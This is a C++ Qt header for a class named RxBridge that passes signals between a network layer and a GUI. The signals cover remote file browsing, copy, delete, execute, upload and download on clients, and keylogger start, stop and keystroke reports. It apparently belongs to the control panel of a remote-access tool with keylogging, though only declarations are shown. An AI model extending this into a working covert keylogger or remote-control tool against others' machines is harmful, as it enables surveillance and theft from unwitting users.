#pragma once

#include			<QThread>
#include			<RxFileSystem.h>

#include			"RxNetwork.h"

class				RxBridge :
	public QThread
{
	Q_OBJECT

public:
	RxBridge(void);
	~RxBridge(void);

public:
	void			run();

signals:
	/* Net to Window */
	void			NewMonitorEventIncident(std::string);
	void			NewMonitorEventSendind(std::string, unsigned int);
	void			NewMonitorEventReception(std::string, unsigned int);
	void			NewUpDownEvent(std::string);
	void			NetAnswerKeyLogInfos(std::string, bool, std::string);
	void			WinAskKeyLogInfos(std::string);
	void			ClientIdentified(std::string);
	void			ClientCrashed(std::string);
	void			ClientAnsVersion(std::string, std::string);
	void			ClientAnsFs(std::string, FileInfo);
	void			ClientAnsFsNext(std::string, FileInfo);
	void			ClientAnsKeyPressed(std::string, std::string);
	/* From updown */
	void			UpdnIncident(std::string);
	void			UpdnNewPartRec(int, int);
	void			UpdnDlFinished();
	void			UpdnNewPartSnd(int, int);
	void			UpdnUpFinished();

	/* Window to Net */
	void			WinAskVer(std::string);
	void			WinAskFs(std::string);
	void			WinAskClientInfos(std::string);
	void			WinAskCd(std::string, std::string);
	void			WinAskDel(std::string, std::string);
	void			WinAskCpy(std::string, std::string);
	void			WinAskPst(std::string);
	void			WinAskRnm(std::string, std::string, std::string);
	void			WinAskCrt(std::string, std::string, std::string);
	void			WinAskExe(std::string, std::string);
	void			WinAskAkl(std::string);
	void			WinAskOkl(std::string);
	void			WinAskCkl(std::string);
	void			WinAskDwn(std::string, std::string);
	void			WinAskUpl(std::string, std::string);
};

